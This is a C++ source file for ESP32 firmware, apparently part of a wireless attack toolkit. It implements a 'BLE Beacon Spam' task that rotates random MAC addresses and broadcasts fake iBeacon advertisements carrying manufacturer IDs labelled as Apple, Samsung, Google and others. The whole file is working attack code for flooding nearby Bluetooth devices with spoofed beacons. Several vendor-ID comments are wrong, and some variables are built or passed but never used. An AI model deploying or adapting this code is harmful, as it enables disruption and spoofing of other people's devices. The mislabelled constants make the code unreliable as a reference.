#include "attack_ble_beacon.h"
#include "BLEDevice.h"
#include "BLEUtils.h"
#include "BLEBeacon.h"
#include "esp_sleep.h"
#include "esp_random.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "freertos/semphr.h"
#include "sys/time.h"

static const char *TAG = "attack_ble_beacon";

// Structure for BLE beacon configuration
typedef struct {
    uint8_t beacon_count;
    uint8_t duration;
} ble_beacon_config_t;

static ble_beacon_config_t current_config;
static TaskHandle_t ble_task_handle = NULL;
static SemaphoreHandle_t ble_mutex = NULL;

// Vendor list (simplified for ESP32)
static const uint16_t vendorList[] = {
    0x004C, // Apple
    0x0050, // Samsung
    0x0060, // Google
    0x0075, // Microsoft
    0x00A0, // Sony
    0x00E0  // LG
};
#define VENDOR_COUNT (sizeof(vendorList) / sizeof(vendorList[0]))

// UUID generator
const char* generate_random_uuid() {
    static char uuid_str[37];
    const char *hex = "0123456789abcdef";
    
    for (int i = 0; i < 36; i++) {
        if (i == 8 || i == 13 || i == 18 || i == 23) {
            uuid_str[i] = '-';
        } else {
            uuid_str[i] = hex[esp_random() % 16];
        }
    }
    uuid_str[36] = '\0';
    
    return uuid_str;
}

// BLE beacon task
void ble_beacon_task(void *param) {
    ble_beacon_config_t config = *(ble_beacon_config_t*)param;
    
    ESP_LOGI(TAG, "Starting BLE Beacon Spam: %d beacons for %d seconds", 
             config.beacon_count, config.duration);
    
    // Initialize BLE
    BLEDevice::init("");
    BLEServer *pServer = BLEDevice::createServer();
    BLEAdvertising *pAdvertising = pServer->getAdvertising();
    
    time_t start_time = time(NULL);
    
    while (time(NULL) - start_time < config.duration) {
        // Generate random MAC address
        uint8_t mac[6];
        for (int i = 0; i < 6; i++) {
            mac[i] = esp_random() & 0xFF;
        }
        mac[0] = (mac[0] & 0xFC) | 0x02; // Set locally administered bit
        
        // Set device address
        BLEDevice::setDeviceAddress(BLEAddress(mac));
        
        // Create beacon
        BLEBeacon beacon;
        beacon.setManufacturerId(vendorList[esp_random() % VENDOR_COUNT]);
        beacon.setProximityUUID(BLEUUID(generate_random_uuid()));
        beacon.setMajor(esp_random() & 0xFFFF);
        beacon.setMinor(esp_random() & 0xFFFF);
        
        // Set up advertising
        BLEAdvertisementData advertisementData;
        advertisementData.setFlags(0x04); // BR_EDR_NOT_SUPPORTED
        
        std::string beaconData = "";
        beaconData += (char)0x02; // Length of AD structure
        beaconData += (char)0x01; // Flags AD type
        beaconData += (char)0x06; // Flags value
        
        std::string serviceData = "";
        serviceData += (char)0x1A; // Length
        serviceData += (char)0xFF; // Manufacturer Specific Data
        serviceData += beacon.getData();
        advertisementData.addData(serviceData);
        
        pAdvertising->setAdvertisementData(advertisementData);
        
        // Start advertising
        pAdvertising->start();
        vTaskDelay(pdMS_TO_TICKS(100)); // Advertise for 100ms
        pAdvertising->stop();
        
        vTaskDelay(pdMS_TO_TICKS(100)); // Delay between beacons
    }
    
    // Clean up BLE
    pAdvertising = nullptr;
    pServer = nullptr;
    BLEDevice::deinit();
    
    ESP_LOGI(TAG, "BLE Beacon Spam completed");
    attack_update_status(FINISHED);
    vTaskDelete(NULL);
}

void attack_ble_beacon_start(uint8_t beacon_count, uint8_t duration) {
    if (ble_mutex == NULL) {
        ble_mutex = xSemaphoreCreateMutex();
    }
    
    if (xSemaphoreTake(ble_mutex, portMAX_DELAY) == pdTRUE) {
        current_config.beacon_count = beacon_count;
        current_config.duration = duration;
        
        xTaskCreate(ble_beacon_task, "ble_beacon", 4096, &current_config, 5, &ble_task_handle);
        xSemaphoreGive(ble_mutex);
    }
}

void attack_ble_beacon_stop() {
    if (xSemaphoreTake(ble_mutex, portMAX_DELAY) == pdTRUE) {
        if (ble_task_handle != NULL) {
            vTaskDelete(ble_task_handle);
            ble_task_handle = NULL;
            
            // Clean up BLE if it was initialized
            BLEDevice::deinit();
        }
        xSemaphoreGive(ble_mutex);
    }
}
